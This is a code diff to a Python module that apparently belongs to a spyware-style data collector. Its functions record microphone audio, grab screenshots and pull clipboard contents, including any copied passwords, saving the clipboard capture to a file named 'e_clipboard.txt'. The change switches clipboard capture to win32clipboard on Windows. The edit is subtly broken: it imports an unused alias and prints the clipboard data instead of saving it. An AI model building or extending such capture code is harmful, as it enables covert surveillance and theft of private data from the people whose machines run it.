@@ -1,8 +1,10 @@
+import sys
+
 from settings import file_path
-import sounddevice as sd
-from scipy.io.wavfile import write
 from PIL import ImageGrab
-import clipboard
+from scipy.io.wavfile import write
+import sounddevice as sd
+import win32clipboard
 
 
 def microphone():
@@ -21,9 +23,14 @@ def screenshot():
 def copy_clipboard():
     with open(file_path + "\\" + "e_clipboard.txt", "a") as f:
         try:
-            text = clipboard.get()
-            f.write("Clipboard Data: \n" + text)
+            if sys.platform == "win32":
+                import win32clipboard as clip
+                win32clipboard.OpenClipboard()
+                pasted_data = win32clipboard.GetClipboardData()
+                win32clipboard.CloseClipboard()
+                print(pasted_data)
         except Exception as e:
             f.write("Clipboard could be not be copied")
+            print(e)
 
 
